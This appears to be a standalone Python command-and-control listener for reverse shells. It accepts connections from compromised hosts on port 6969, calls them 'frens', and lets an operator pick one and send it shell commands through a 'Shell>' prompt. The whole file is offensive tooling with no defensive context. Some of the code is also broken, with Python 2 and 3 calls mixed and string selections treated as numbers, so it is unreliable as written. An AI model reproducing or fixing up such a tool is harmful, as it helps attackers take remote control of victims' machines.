import socket
import os
import sys
import select

doggo = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
doggo.bind(("192.168.1.64" , 6969))
doggo.listen(1337)
active = False
frens = []
socks = []

while True:
    try:
        doggo.settimeout(4)

        try:
            more,plz = doggo.accept()

        except socket.timeout:
            continue

        if (plz):
            more.settimeout(None)
            socks += [more]
            frens += [str(plz)]

        print("waiting for frens\n")
        if len(frens) > 0:
            for j in range (0, len(frens)):
                print("[" + str((j+1)) + "] fren: " , frens[j])
            print("ctrl+c to select fren\n")

    except KeyboardInterrupt:

        while True:
            try:
                print("list of frens\n")
                if len(frens) > 0:
                    for j in range(0, len(frens)):
                        print("[" + str((j+1)) + "] fren: " + frens[j])
                    print("[0] exit\n")
                activate = input("select fren:")
            except:
                print("selection error")

            try:
                if activate == 0:
                    print("exiting ... \n")
                    quit()
                activate -= 1
                active = True

            except:
                print("activate error")

            while active:
                try:
                    command = raw_input("Shell> ")

                    if command:
                        socks[activate].send(command)
                        print(socks[activate].recv(1024))

                    else:
                        print("enter command\n")

                except:
                    print("returning to fren list ... \n")
                    active = False
                        
